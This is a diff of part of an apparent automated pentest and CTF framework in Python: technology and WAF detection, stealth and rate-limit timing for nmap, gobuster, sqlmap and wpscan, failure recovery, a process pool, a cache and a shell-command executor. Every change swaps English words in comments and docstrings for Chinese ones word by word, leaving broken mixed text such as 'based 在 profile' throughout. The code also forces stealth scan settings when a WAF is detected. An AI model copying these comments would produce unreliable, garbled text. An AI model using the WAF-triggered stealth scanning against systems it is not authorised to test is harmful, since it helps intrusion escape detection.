+            "unknown": 5400  # 说明：1.5 hours
         }
 
         base_time = base_times[challenge.difficulty]
 
-        # Skill bonus
+        # 说明：Skill bonus
         if member_skills.get(challenge.category, False):
-            base_time = int(base_time * 0.7)  # 30% faster with relevant skills
+            base_time = int(base_time * 0.7)  # 30% faster 使用 relevant skills
 
         return base_time
 
     def _assign_challenges_optimally(self, member_challenge_scores: Dict[str, List[Dict]]) -> Dict[str, List[Dict]]:
-        """Assign challenges to team members optimally"""
+        """Assign challenges 到 team members optimally"""
         assignments = {member: [] for member in member_challenge_scores.keys()}
         assigned_challenges = set()
 
-        # Simple greedy assignment (in practice, would use Hungarian algorithm)
+        # 简单 greedy assignment (在 practice, would use Hungarian algorithm)
         for _ in range(len(member_challenge_scores)):
             best_assignment = None
             best_score = -1
@@ -4224,12 +4224,12 @@ class CTFTeamCoordinator:
         return assignments
 
     def _identify_collaboration_opportunities(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> List[Dict[str, Any]]:
-        """Identify challenges that would benefit from team collaboration"""
+        """Identify challenges that would benefit 来自 team collaboration"""
         collaboration_opportunities = []
 
         for challenge in challenges:
             if challenge.difficulty in ["hard", "insane"]:
-                # High-difficulty challenges benefit from collaboration
+                # High-difficulty challenges benefit 来自 collaboration
                 relevant_members = []
                 for member, skills in team_skills.items():
                     if challenge.category in [skill.lower() for skill in skills]:
@@ -4245,11 +4245,11 @@ class CTFTeamCoordinator:
         return collaboration_opportunities
 
 # ============================================================================
-# ADVANCED PARAMETER OPTIMIZATION AND INTELLIGENCE (v9.0 ENHANCEMENT)
+# 高级 参数 OPTIMIZATION 与 INTELLIGENCE (v9.0 ENHANCEMENT)
 # ============================================================================
 
 class TechnologyDetector:
-    """Advanced technology detection system for context-aware parameter selection"""
+    """高级 technology detection 系统 用于 context-aware 参数 selection"""
 
     def __init__(self):
         self.detection_patterns = {
@@ -4328,7 +4328,7 @@ class TechnologyDetector:
         }
 
     def detect_technologies(self, target: str, headers: Dict[str, str] = None, content: str = "", ports: List[int] = None) -> Dict[str, List[str]]:
-        """Comprehensive technology detection"""
+        """综合 technology detection"""
         detected = {
             "web_servers": [],
             "frameworks": [],
@@ -4339,7 +4339,7 @@ class TechnologyDetector:
             "services": []
         }
 
-        # Header-based detection
+        # 请求头-based detection
         if headers:
             for category, tech_patterns in self.detection_patterns.items():
                 for tech, patterns in tech_patterns.items():
@@ -4349,7 +4349,7 @@ class TechnologyDetector:
                                 if tech not in detected[category]:
                                     detected[category].append(tech)
 
-        # Content-based detection
+        # 说明：Content-based detection
         if content:
             content_lower = content.lower()
             for category, tech_patterns in self.detection_patterns.items():
@@ -4359,7 +4359,7 @@ class TechnologyDetector:
                             if tech not in detected[category]:
                                 detected[category].append(tech)
 
-        # Port-based service detection
+        # 说明：Port-based service detection
         if ports:
             for port in ports:
                 if port in self.port_services:
@@ -4370,7 +4370,7 @@ class TechnologyDetector:
         return detected
 
 class RateLimitDetector:
-    """Intelligent rate limiting detection and automatic timing adjustment"""
+    """智能 rate limiting detection 与 automatic timing adjustment"""
 
     def __init__(self):
         self.rate_limit_indicators = [
@@ -4393,18 +4393,18 @@ class RateLimitDetector:
         }
 
     def detect_rate_limiting(self, response_text: str, status_code: int, headers: Dict[str, str] = None) -> Dict[str, Any]:
-        """Detect rate limiting from response"""
+        """Detect rate limiting 来自 响应"""
         rate_limit_detected = False
         confidence = 0.0
         indicators_found = []
 
-        # Status code check
+        # 状态 code 检查
         if status_code == 429:
             rate_limit_detected = True
             confidence += 0.8
             indicators_found.append("HTTP 429 status")
 
-        # Response text check
+        # 响应 text 检查
         response_lower = response_text.lower()
         for indicator in self.rate_limit_indicators:
             if indicator in response_lower:
@@ -4412,7 +4412,7 @@ class RateLimitDetector:
                 confidence += 0.2
                 indicators_found.append(f"Text: '{indicator}'")
 
-        # Header check
+        # 请求头 检查
         if headers:
             rate_limit_headers = ["x-ratelimit", "retry-after", "x-rate-limit"]
             for header_name in headers.keys():
@@ -4432,7 +4432,7 @@ class RateLimitDetector:
         }
 
     def _recommend_timing_profile(self, confidence: float) -> str:
-        """Recommend timing profile based on rate limit confidence"""
+        """Recommend timing profile based 在 rate limit confidence"""
         if confidence >= 0.8:
             return "stealth"
         elif confidence >= 0.5:
@@ -4443,12 +4443,12 @@ class RateLimitDetector:
             return "aggressive"
 
     def adjust_timing(self, current_params: Dict[str, Any], profile: str) -> Dict[str, Any]:
-        """Adjust timing parameters based on profile"""
+        """Adjust timing 参数 based 在 profile"""
         timing = self.timing_profiles.get(profile, self.timing_profiles["normal"])
 
         adjusted_params = current_params.copy()
 
-        # Adjust common parameters
+        # Adjust 常见 参数
         if "threads" in adjusted_params:
             adjusted_params["threads"] = timing["threads"]
         if "delay" in adjusted_params:
@@ -4456,16 +4456,16 @@ class RateLimitDetector:
         if "timeout" in adjusted_params:
             adjusted_params["timeout"] = timing["timeout"]
 
-        # Tool-specific adjustments
+        # 说明：Tool-specific adjustments
         if "additional_args" in adjusted_params:
             args = adjusted_params["additional_args"]
 
-            # Remove existing timing arguments
+            # 说明：Remove existing timing arguments
             args = re.sub(r'-t\s+\d+', '', args)
             args = re.sub(r'--threads\s+\d+', '', args)
             args = re.sub(r'--delay\s+[\d.]+', '', args)
 
-            # Add new timing arguments
+            # 说明：Add new timing arguments
             args += f" -t {timing['threads']}"
             if timing["delay"] > 0:
                 args += f" --delay {timing['delay']}"
@@ -4475,7 +4475,7 @@ class RateLimitDetector:
         return adjusted_params
 
 class FailureRecoverySystem:
-    """Intelligent failure recovery with alternative tool selection"""
+    """智能 failure 恢复 使用 alternative 工具 selection"""
 
     def __init__(self):
         self.tool_alternatives = {
@@ -4499,14 +4499,14 @@ class FailureRecoverySystem:
         }
 
     def analyze_failure(self, error_output: str, exit_code: int) -> Dict[str, Any]:
-        """Analyze failure and suggest recovery strategies"""
+        """分析 failure 与 suggest 恢复 strategies"""
         failure_type = "unknown"
         confidence = 0.0
         recovery_strategies = []
 
         error_lower = error_output.lower()
 
-        # Identify failure type
+        # Identify failure 类型
         for failure, patterns in self.failure_patterns.items():
             for pattern in patterns:
                 if pattern in error_lower:
@@ -4514,19 +4514,19 @@ class FailureRecoverySystem:
                     confidence += 0.3
                     break
 
-        # Exit code analysis
+        # Exit code 分析
         if exit_code == 1:
             confidence += 0.1
-        elif exit_code == 124:  # timeout
+        elif exit_code == 124:  # 超时
             failure_type = "timeout"
             confidence += 0.5
-        elif exit_code == 126:  # permission denied
+        elif exit_code == 126:  # 说明：permission denied
             failure_type = "permission_denied"
             confidence += 0.5
 
         confidence = min(1.0, confidence)
 
-        # Generate recovery strategies
+        # 生成 恢复 strategies
         if failure_type == "timeout":
             recovery_strategies = [
                 "Increase timeout values",
@@ -4563,14 +4563,14 @@ class FailureRecoverySystem:
         }
 
     def _extract_tool_name(self, error_output: str) -> str:
-        """Extract tool name from error output"""
+        """Extract 工具 name 来自 错误 输出"""
         for tool in self.tool_alternatives.keys():
             if tool in error_output.lower():
                 return tool
         return "unknown"
 
 class PerformanceMonitor:
-    """Advanced performance monitoring with automatic resource allocation"""
+    """高级 performance 监控 使用 automatic resource allocation"""
 
     def __init__(self):
         self.performance_metrics = {}
@@ -4605,7 +4605,7 @@ class PerformanceMonitor:
         }
 
     def monitor_system_resources(self) -> Dict[str, float]:
-        """Monitor current system resource usage"""
+        """监控 current 系统 resource usage"""
         try:
             cpu_percent = psutil.cpu_percent(interval=1)
             memory = psutil.virtual_memory()
@@ -4625,11 +4625,11 @@ class PerformanceMonitor:
             return {}
 
     def optimize_based_on_resources(self, current_params: Dict[str, Any], resource_usage: Dict[str, float]) -> Dict[str, Any]:
-        """Optimize parameters based on current resource usage"""
+        """Optimize 参数 based 在 current resource usage"""
         optimized_params = current_params.copy()
         optimizations_applied = []
 
-        # CPU optimization
+        # 说明：CPU optimization
         if resource_usage.get("cpu_percent", 0) > self.resource_thresholds["cpu_high"]:
             if "threads" in optimized_params:
                 original_threads = optimized_params["threads"]
@@ -4641,17 +4641,17 @@ class PerformanceMonitor:
                 optimized_params["delay"] = original_delay * self.optimization_rules["high_cpu"]["increase_delay"]
                 optimizations_applied.append(f"Increased delay to {optimized_params['delay']}")
 
-        # Memory optimization
+        # 内存 optimization
         if resource_usage.get("memory_percent", 0) > self.resource_thresholds["memory_high"]:
             if "batch_size" in optimized_params:
                 original_batch = optimized_params["batch_size"]
                 optimized_params["batch_size"] = max(1, int(original_batch * self.optimization_rules["high_memory"]["reduce_batch_size"]))
                 optimizations_applied.append(f"Reduced batch size from {original_batch} to {optimized_params['batch_size']}")
 
-        # Network optimization
+        # 网络 optimization
         if "network_bytes_sent" in resource_usage:
-            # Simple heuristic for high network usage
-            if resource_usage["network_bytes_sent"] > 1000000:  # 1MB/s
+            # 简单 heuristic 用于 高 网络 usage
+            if resource_usage["network_bytes_sent"] > 1000000:  # 说明：1MB/s
                 if "concurrent_connections" in optimized_params:
                     original_conn = optimized_params["concurrent_connections"]
                     optimized_params["concurrent_connections"] = max(1, int(original_conn * self.optimization_rules["high_network"]["reduce_concurrent_connections"]))
@@ -4661,7 +4661,7 @@ class PerformanceMonitor:
         return optimized_params
 
 class ParameterOptimizer:
-    """Advanced parameter optimization system with intelligent context-aware selection"""
+    """高级 参数 optimization 系统 使用 智能 context-aware selection"""
 
     def __init__(self):
         self.tech_detector = TechnologyDetector()
@@ -4669,7 +4669,7 @@ class ParameterOptimizer:
         self.failure_recovery = FailureRecoverySystem()
         self.performance_monitor = PerformanceMonitor()
 
-        # Tool-specific optimization profiles
+        # 说明：Tool-specific optimization profiles
         self.optimization_profiles = {
             "nmap": {
                 "stealth": {
@@ -4728,14 +4728,14 @@ class ParameterOptimizer:
         }
 
     def optimize_parameters_advanced(self, tool: str, target_profile: TargetProfile, context: Dict[str, Any] = None) -> Dict[str, Any]:
-        """Advanced parameter optimization with full intelligence"""
+        """高级 参数 optimization 使用 full intelligence"""
         if context is None:
             context = {}
 
-        # Get base parameters
+        # 获取 base 参数
         base_params = self._get_base_parameters(tool, target_profile)
 
-        # Detect technologies for context-aware optimization
+        # Detect technologies 用于 context-aware optimization
         detected_tech = self.tech_detector.detect_technologies(
             target_profile.target,
             headers=context.get("headers", {}),
@@ -4743,18 +4743,18 @@ class ParameterOptimizer:
             ports=target_profile.open_ports
         )
 
-        # Apply technology-specific optimizations
+        # 说明：Apply technology-specific optimizations
         tech_optimized_params = self._apply_technology_optimizations(tool, base_params, detected_tech)
 
-        # Monitor system resources and optimize accordingly
+        # 监控 系统 resources 与 optimize accordingly
         resource_usage = self.performance_monitor.monitor_system_resources()
         resource_optimized_params = self.performance_monitor.optimize_based_on_resources(tech_optimized_params, resource_usage)
 
-        # Apply profile-based optimizations
+        # 说明：Apply profile-based optimizations
         profile = context.get("optimization_profile", "normal")
         profile_optimized_params = self._apply_profile_optimizations(tool, resource_optimized_params, profile)
 
-        # Add metadata
+        # 说明：Add metadata
         profile_optimized_params["_optimization_metadata"] = {
             "detected_technologies": detected_tech,
             "resource_usage": resource_usage,
@@ -4766,10 +4766,10 @@ class ParameterOptimizer:
         return profile_optimized_params
 
     def _get_base_parameters(self, tool: str, profile: TargetProfile) -> Dict[str, Any]:
-        """Get base parameters for a tool"""
+        """获取 base 参数 用于 a 工具"""
         base_params = {"target": profile.target}
 
-        # Tool-specific base parameters
+        # Tool-specific base 参数
         if tool == "nmap":
             base_params.update({
                 "scan_type": "-sS",
@@ -4797,10 +4797,10 @@ class ParameterOptimizer:
         return base_params
 
     def _apply_technology_optimizations(self, tool: str, params: Dict[str, Any], detected_tech: Dict[str, List[str]]) -> Dict[str, Any]:
-        """Apply technology-specific optimizations"""
+        """说明：Apply technology-specific optimizations"""
         optimized_params = params.copy()
 
-        # Web server optimizations
+        # Web 服务端 optimizations
         if "apache" in detected_tech.get("web_servers", []):
             if tool == "gobuster":
                 optimized_params["extensions"] = "php,html,txt,xml,conf"
@@ -4813,7 +4813,7 @@ class ParameterOptimizer:
             elif tool == "nuclei":
                 optimized_params["tags"] = optimized_params.get("tags", "") + ",nginx"
 
-        # CMS optimizations
+        # 说明：CMS optimizations
         if "wordpress" in detected_tech.get("cms", []):
             if tool == "gobuster":
                 optimized_params["extensions"] = "php,html,txt,xml"
@@ -4823,7 +4823,7 @@ class ParameterOptimizer:
             elif tool == "wpscan":
                 optimized_params["enumerate"] = "ap,at,cb,dbe"
 
-        # Language-specific optimizations
+        # 说明：Language-specific optimizations
         if "php" in detected_tech.get("languages", []):
             if tool == "gobuster":
                 optimized_params["extensions"] = "php,php3,php4,php5,phtml,html"
@@ -4836,9 +4836,9 @@ class ParameterOptimizer:
             elif tool == "sqlmap":
                 optimized_params["dbms"] = "mssql"
 
-        # Security feature adaptations
+        # 安全 feature adaptations
         if detected_tech.get("security", []):
-            # WAF detected - use stealth mode
+            # WAF detected - use stealth 模式
             if any(waf in detected_tech["security"] for waf in ["cloudflare", "incapsula", "sucuri"]):
                 optimized_params["_stealth_mode"] = True
                 if tool == "gobuster":
@@ -4851,20 +4851,20 @@ class ParameterOptimizer:
         return optimized_params
 
     def _apply_profile_optimizations(self, tool: str, params: Dict[str, Any], profile: str) -> Dict[str, Any]:
-        """Apply optimization profile settings"""
+        """说明：Apply optimization profile settings"""
         if tool not in self.optimization_profiles:
             return params
 
         profile_settings = self.optimization_profiles[tool].get(profile, {})
         optimized_params = params.copy()
 
-        # Apply profile-specific settings
+        # 说明：Apply profile-specific settings
         for key, value in profile_settings.items():
             optimized_params[key] = value
 
-        # Handle stealth mode flag
+        # 处理 stealth 模式 flag
         if params.get("_stealth_mode", False) and profile != "stealth":
-            # Force stealth settings even if different profile requested
+            # Force stealth settings even 如果 different profile requested
             stealth_settings = self.optimization_profiles[tool].get("stealth", {})
             for key, value in stealth_settings.items():
                 optimized_params[key] = value
@@ -4872,7 +4872,7 @@ class ParameterOptimizer:
         return optimized_params
 
     def handle_tool_failure(self, tool: str, error_output: str, exit_code: int, current_params: Dict[str, Any]) -> Dict[str, Any]:
-        """Handle tool failure and suggest recovery"""
+        """处理 工具 failure 与 suggest 恢复"""
         failure_analysis = self.failure_recovery.analyze_failure(error_output, exit_code)
 
         recovery_plan = {
@@ -4883,7 +4883,7 @@ class ParameterOptimizer:
             "adjusted_parameters": current_params.copy()
         }
 
-        # Apply automatic parameter adjustments based on failure type
+        # Apply automatic 参数 adjustments based 在 failure 类型
         if failure_analysis["failure_type"] == "timeout":
             if "timeout" in recovery_plan["adjusted_parameters"]:
                 recovery_plan["adjusted_parameters"]["timeout"] *= 2
@@ -4899,11 +4899,11 @@ class ParameterOptimizer:
         return recovery_plan
 
 # ============================================================================
-# ADVANCED PROCESS MANAGEMENT AND MONITORING (v10.0 ENHANCEMENT)
+# 高级 进程 MANAGEMENT 与 监控 (v10.0 ENHANCEMENT)
 # ============================================================================
 
 class ProcessPool:
-    """Intelligent process pool with auto-scaling capabilities"""
+    """智能 进程 pool 使用 auto-scaling capabilities"""
 
     def __init__(self, min_workers=2, max_workers=20, scale_threshold=0.8):
         self.min_workers = min_workers
@@ -4922,15 +4922,15 @@ class ProcessPool:
             "memory_usage": 0.0
         }
 
-        # Initialize minimum workers
+        # 初始化 minimum workers
         self._scale_up(self.min_workers)
 
-        # Start monitoring thread
+        # Start 监控 thread
         self.monitor_thread = threading.Thread(target=self._monitor_performance, daemon=True)
         self.monitor_thread.start()
 
     def submit_task(self, task_id: str, func, *args, **kwargs) -> str:
-        """Submit a task to the process pool"""
+        """Submit a task 到 the 进程 pool"""
         task = {
             "id": task_id,
             "func": func,
@@ -4948,7 +4948,7 @@ class ProcessPool:
         return task_id
 
     def get_task_result(self, task_id: str) -> Dict[str, Any]:
-        """Get result of a submitted task"""
+        """获取 结果 的 a submitted task"""
         with self.pool_lock:
             if task_id in self.results:
                 return self.results[task_id]
@@ -4958,20 +4958,20 @@ class ProcessPool:
                 return {"status": "not_found", "result": None}
 
     def _worker_thread(self, worker_id: int):
-        """Worker thread that processes tasks"""
+        """说明：Worker thread that processes tasks"""
         logger.info(f" Process pool worker {worker_id} started")
 
         while True:
             try:
-                # Get task from queue with timeout
+                # 获取 task 来自 queue 使用 超时
                 task = self.task_queue.get(timeout=30)
-                if task is None:  # Shutdown signal
+                if task is None:  # 说明：Shutdown signal
                     break
 
                 task_id = task["id"]
                 start_time = time.time()
 
-                # Update task status
+                # 更新 task 状态
                 with self.pool_lock:
                     if task_id in self.active_tasks:
                         self.active_tasks[task_id]["status"] = "running"
@@ -4979,10 +4979,10 @@ class ProcessPool:
                         self.active_tasks[task_id]["started_at"] = start_time
 
                 try:
-                    # Execute task
+                    # 执行 task
                     result = task["func"](*task["args"], **task["kwargs"])
 
-                    # Store result
+                    # Store 结果
                     execution_time = time.time() - start_time
                     with self.pool_lock:
                         self.results[task_id] = {
@@ -4993,21 +4993,21 @@ class ProcessPool:
                             "completed_at": time.time()
                         }
 
-                        # Update performance metrics
+                        # 更新 performance 指标
                         self.performance_metrics["tasks_completed"] += 1
                         self.performance_metrics["avg_task_time"] = (
                             (self.performance_metrics["avg_task_time"] * (self.performance_metrics["tasks_completed"] - 1) + execution_time) /
                             self.performance_metrics["tasks_completed"]
                         )
 
-                        # Remove from active tasks
+                        # Remove 来自 active tasks
                         if task_id in self.active_tasks:
                             del self.active_tasks[task_id]
 
                     logger.info(f" Task completed: {task_id} in {execution_time:.2f}s")
 
                 except Exception as e:
-                    # Handle task failure
+                    # 处理 task failure
                     with self.pool_lock:
                         self.results[task_id] = {
                             "status": "failed",
@@ -5027,42 +5027,42 @@ class ProcessPool:
                 self.task_queue.task_done()
 
             except queue.Empty:
-                # No tasks available, continue waiting
+                # 说明：No tasks available, continue waiting
                 continue
             except Exception as e:
                 logger.error(f" Worker {worker_id} error: {str(e)}")
 
     def _monitor_performance(self):
-        """Monitor pool performance and auto-scale"""
+        """监控 pool performance 与 auto-scale"""
         while True:
             try:
-                time.sleep(10)  # Monitor every 10 seconds
+                time.sleep(10)  # 监控 every 10 seconds
 
                 with self.pool_lock:
                     queue_size = self.task_queue.qsize()
                     active_workers = len([w for w in self.workers if w.is_alive()])
                     active_tasks_count = len(self.active_tasks)
 
-                # Calculate load metrics
+                # 计算 load 指标
                 if active_workers > 0:
                     load_ratio = (active_tasks_count + queue_size) / active_workers
                 else:
                     load_ratio = float('inf')
 
-                # Auto-scaling logic
+                # 说明：Auto-scaling logic
                 if load_ratio > self.scale_threshold and active_workers < self.max_workers:
-                    # Scale up
+                    # 说明：Scale up
                     new_workers = min(2, self.max_workers - active_workers)
                     self._scale_up(new_workers)
                     logger.info(f" Scaled up process pool: +{new_workers} workers (total: {active_workers + new_workers})")
 
                 elif load_ratio < 0.3 and active_workers > self.min_workers:
-                    # Scale down
+                    # 说明：Scale down
                     workers_to_remove = min(1, active_workers - self.min_workers)
                     self._scale_down(workers_to_remove)
                     logger.info(f" Scaled down process pool: -{workers_to_remove} workers (total: {active_workers - workers_to_remove})")
 
-                # Update performance metrics
+                # 更新 performance 指标
                 try:
                     cpu_percent = psutil.cpu_percent()
                     memory_info = psutil.virtual_memory()
@@ -5072,13 +5072,13 @@ class ProcessPool:
                         self.performance_metrics["memory_usage"] = memory_info.percent
 
                 except Exception:
-                    pass  # Ignore psutil errors
+                    pass  # 说明：Ignore psutil errors
 
             except Exception as e:
                 logger.error(f" Pool monitor error: {str(e)}")
 
     def _scale_up(self, count: int):
-        """Add workers to the pool"""
+        """Add workers 到 the pool"""
         with self.pool_lock:
             for i in range(count):
                 worker_id = len(self.workers)
@@ -5087,18 +5087,18 @@ class ProcessPool:
                 self.workers.append(worker)
 
     def _scale_down(self, count: int):
-        """Remove workers from the pool"""
+        """Remove workers 来自 the pool"""
         with self.pool_lock:
             for _ in range(count):
                 if len(self.workers) > self.min_workers:
-                    # Signal worker to shutdown by putting None in queue
+                    # Signal worker 到 shutdown 由 putting None 在 queue
                     self.task_queue.put(None)
-                    # Remove from workers list (worker will exit naturally)
+                    # Remove 来自 workers 列出 (worker will exit naturally)
                     if self.workers:
                         self.workers.pop()
 
     def get_pool_stats(self) -> Dict[str, Any]:
-        """Get current pool statistics"""
+        """获取 current pool 统计"""
         with self.pool_lock:
             active_workers = len([w for w in self.workers if w.is_alive()])
             return {
@@ -5111,7 +5111,7 @@ class ProcessPool:
             }
 
 class AdvancedCache:
-    """Advanced caching system with intelligent TTL and LRU eviction"""
+    """高级 caching 系统 使用 智能 TTL 与 LRU eviction"""
 
     def __init__(self, max_size=1000, default_ttl=3600):
         self.max_size = max_size
@@ -5123,50 +5123,50 @@ class AdvancedCache:
         self.hit_count = 0
         self.miss_count = 0
 
-        # Start cleanup thread
+        # 说明：Start cleanup thread
         self.cleanup_thread = threading.Thread(target=self._cleanup_expired, daemon=True)
         self.cleanup_thread.start()
 
     def get(self, key: str) -> Any:
-        """Get value from cache"""
+        """获取 value 来自 缓存"""
         with self.cache_lock:
             current_time = time.time()
 
-            # Check if key exists and is not expired
+            # 检查 如果 key exists 与 is not expired
             if key in self.cache and (key not in self.ttl_times or self.ttl_times[key] > current_time):
-                # Update access time for LRU
+                # 更新 access time 用于 LRU
                 self.access_times[key] = current_time
                 self.hit_count += 1
                 return self.cache[key]
 
-            # Cache miss or expired
+            # 缓存 miss 或 expired
             if key in self.cache:
-                # Remove expired entry
+                # Remove expired 入口
                 self._remove_key(key)
 
             self.miss_count += 1
             return None
 
     def set(self, key: str, value: Any, ttl: int = None) -> None:
-        """Set value in cache with optional TTL"""
+        """设置 value 在 缓存 使用 optional TTL"""
         with self.cache_lock:
             current_time = time.time()
 
-            # Use default TTL if not specified
+            # Use 默认 TTL 如果 not specified
             if ttl is None:
                 ttl = self.default_ttl
 
-            # Check if we need to evict entries
+            # 检查 如果 we need 到 evict entries
             if len(self.cache) >= self.max_size and key not in self.cache:
                 self._evict_lru()
 
-            # Set the value
+            # 设置 the value
             self.cache[key] = value
             self.access_times[key] = current_time
             self.ttl_times[key] = current_time + ttl
 
     def delete(self, key: str) -> bool:
-        """Delete key from cache"""
+        """删除 key 来自 缓存"""
         with self.cache_lock:
             if key in self.cache:
                 self._remove_key(key)
@@ -5174,33 +5174,33 @@ class AdvancedCache:
             return False
 
     def clear(self) -> None:
-        """Clear all cache entries"""
+        """Clear 全部 缓存 entries"""
         with self.cache_lock:
             self.cache.clear()
             self.access_times.clear()
             self.ttl_times.clear()
 
     def _remove_key(self, key: str) -> None:
-        """Remove key and associated metadata"""
+        """Remove key 与 associated metadata"""
         self.cache.pop(key, None)
         self.access_times.pop(key, None)
         self.ttl_times.pop(key, None)
 
     def _evict_lru(self) -> None:
-        """Evict least recently used entry"""
+        """Evict least recently used 入口"""
         if not self.access_times:
             return
 
-        # Find least recently used key
+        # 说明：Find least recently used key
         lru_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
         self._remove_key(lru_key)
         logger.debug(f" Evicted LRU cache entry: {lru_key}")
 
     def _cleanup_expired(self) -> None:
-        """Cleanup expired entries periodically"""
+        """说明：Cleanup expired entries periodically"""
         while True:
             try:
-                time.sleep(60)  # Cleanup every minute
+                time.sleep(60)  # 说明：Cleanup every minute
                 current_time = time.time()
                 expired_keys = []
 
@@ -5219,7 +5219,7 @@ class AdvancedCache:
                 logger.error(f" Cache cleanup error: {str(e)}")
 
     def get_stats(self) -> Dict[str, Any]:
-        """Get cache statistics"""
+        """获取 缓存 统计"""
         with self.cache_lock:
             total_requests = self.hit_count + self.miss_count
             hit_rate = (self.hit_count / total_requests * 100) if total_requests > 0 else 0
@@ -5234,21 +5234,21 @@ class AdvancedCache:
             }
 
 class EnhancedProcessManager:
-    """Advanced process management with intelligent resource allocation"""
+    """高级 进程 management 使用 智能 resource allocation"""
 
     def __init__(self):
         self.process_pool = ProcessPool(min_workers=4, max_workers=32)
-        self.cache = AdvancedCache(max_size=2000, default_ttl=1800)  # 30 minutes default TTL
+        self.cache = AdvancedCache(max_size=2000, default_ttl=1800)  # 30 minutes 默认 TTL
         self.resource_monitor = ResourceMonitor()
         self.process_registry = {}
         self.registry_lock = threading.RLock()
         self.performance_dashboard = PerformanceDashboard()
 
-        # Process termination and recovery
+        # 进程 termination 与 恢复
         self.termination_handlers = {}
         self.recovery_strategies = {}
 
-        # Auto-scaling configuration
+        # Auto-scaling 配置
         self.auto_scaling_enabled = True
         self.resource_thresholds = {
             "cpu_high": 85.0,
@@ -5257,22 +5257,22 @@ class EnhancedProcessManager:
             "load_high": 0.8
         }
 
-        # Start background monitoring
+        # Start background 监控
         self.monitor_thread = threading.Thread(target=self._monitor_system, daemon=True)
         self.monitor_thread.start()
 
     def execute_command_async(self, command: str, context: Dict[str, Any] = None) -> str:
-        """Execute command asynchronously using process pool"""
+        """执行 命令 asynchronously using 进程 pool"""
         task_id = f"cmd_{int(time.time() * 1000)}_{hash(command) % 10000}"
 
-        # Check cache first
+        # 检查 缓存 第一
         cache_key = f"cmd_result_{hash(command)}"
         cached_result = self.cache.get(cache_key)
         if cached_result and context and context.get("use_cache", True):
             logger.info(f" Using cached result for command: {command[:50]}...")
             return cached_result
 
-        # Submit to process pool
+        # Submit 到 进程 pool
         self.process_pool.submit_task(
             task_id,
             self._execute_command_internal,
@@ -5283,20 +5283,20 @@ class EnhancedProcessManager:
         return task_id
 
     def _execute_command_internal(self, command: str, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Internal command execution with enhanced monitoring"""
+        """Internal 命令 execution 使用 增强 监控"""
         start_time = time.time()
 
         try:
-            # Resource-aware execution
+            # 说明：Resource-aware execution
             resource_usage = self.resource_monitor.get_current_usage()
 
-            # Adjust command based on resource availability
+            # Adjust 命令 based 在 resource availability
             if resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"]:
-                # Add nice priority for CPU-intensive commands
+                # Add nice priority 用于 CPU-intensive 命令
                 if not command.startswith("nice"):
                     command = f"nice -n 10 {command}"
 
-            # Execute command
+            # 执行 命令
             process = subprocess.Popen(
                 command,
                 shell=True,
@@ -5306,7 +5306,7 @@ class EnhancedProcessManager:
                 preexec_fn=os.setsid if os.name != 'nt' else None
             )
 
-            # Register process
+            # Register 进程
             with self.registry_lock:
                 self.process_registry[process.pid] = {
                     "command": command,
@@ -5316,7 +5316,7 @@ class EnhancedProcessManager:
                     "status": "running"
                 }
 
-            # Monitor process execution
+            # 监控 进程 execution
             stdout, stderr = process.communicate()
             execution_time = time.time() - start_time
 
@@ -5330,13 +5330,13 @@ class EnhancedProcessManager:
                 "resource_usage": self.resource_monitor.get_process_usage(process.pid)
             }
 
-            # Cache successful results
+            # 缓存 successful 结果
             if result["success"] and context.get("cache_result", True):
                 cache_key = f"cmd_result_{hash(command)}"
-                cache_ttl = context.get("cache_ttl", 1800)  # 30 minutes default
+                cache_ttl = context.get("cache_ttl", 1800)  # 30 minutes 默认
                 self.cache.set(cache_key, result, cache_ttl)
 
-            # Update performance metrics
+            # 更新 performance 指标
             self.performance_dashboard.record_execution(command, result)
 
             return result
@@ -5356,17 +5356,17 @@ class EnhancedProcessManager:
             return error_result
 
         finally:
-            # Cleanup process registry
+            # Cleanup 进程 registry
             with self.registry_lock:
                 if hasattr(process, 'pid') and process.pid in self.process_registry:
                     del self.process_registry[process.pid]
 
     def get_task_result(self, task_id: str) -> Dict[str, Any]:
-        """Get result of async task"""
+        """获取 结果 的 async task"""
         return self.process_pool.get_task_result(task_id)
 
     def terminate_process_gracefully(self, pid: int, timeout: int = 30) -> bool:
-        """Terminate process with graceful degradation"""
+        """Terminate 进程 使用 graceful degradation"""
         try:
             with self.registry_lock:
                 if pid not in self.process_registry:
@@ -5375,17 +5375,17 @@ class EnhancedProcessManager:
                 process_info = self.process_registry[pid]
                 process = process_info["process"]
 
-                # Try graceful termination first
+                # Try graceful termination 第一
                 process.terminate()
 
-                # Wait for graceful termination
+                # Wait 用于 graceful termination
                 try:
                     process.wait(timeout=timeout)
                     process_info["status"] = "terminated_gracefully"
                     logger.info(f" Process {pid} terminated gracefully")
                     return True
                 except subprocess.TimeoutExpired:
-                    # Force kill if graceful termination fails
+                    # Force kill 如果 graceful termination fails
                     process.kill()
                     process_info["status"] = "force_killed"
                     logger.warning(f" Process {pid} force killed after timeout")
@@ -5396,30 +5396,30 @@ class EnhancedProcessManager:
             return False
 
     def _monitor_system(self):
-        """Monitor system resources and auto-scale"""
+        """监控 系统 resources 与 auto-scale"""
         while True:
             try:
-                time.sleep(15)  # Monitor every 15 seconds
+                time.sleep(15)  # 监控 every 15 seconds
 
-                # Get current resource usage
+                # 获取 current resource usage
                 resource_usage = self.resource_monitor.get_current_usage()
 
-                # Auto-scaling based on resource usage
+                # Auto-scaling based 在 resource usage
                 if self.auto_scaling_enabled:
                     self._auto_scale_based_on_resources(resource_usage)
 
-                # Update performance dashboard
+                # 更新 performance dashboard
                 self.performance_dashboard.update_system_metrics(resource_usage)
 
             except Exception as e:
                 logger.error(f" System monitoring error: {str(e)}")
 
     def _auto_scale_based_on_resources(self, resource_usage: Dict[str, float]):
-        """Auto-scale process pool based on resource usage"""
+        """Auto-scale 进程 pool based 在 resource usage"""
         pool_stats = self.process_pool.get_pool_stats()
         current_workers = pool_stats["active_workers"]
 
-        # Scale down if resources are constrained
+        # Scale down 如果 resources are constrained
         if (resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"] or
             resource_usage["memory_percent"] > self.resource_thresholds["memory_high"]):
 
@@ -5427,7 +5427,7 @@ class EnhancedProcessManager:
                 self.process_pool._scale_down(1)
                 logger.info(f" Auto-scaled down due to high resource usage: CPU {resource_usage['cpu_percent']:.1f}%, Memory {resource_usage['memory_percent']:.1f}%")
 
-        # Scale up if resources are available and there's demand
+        # Scale up 如果 resources are available 与 there's demand
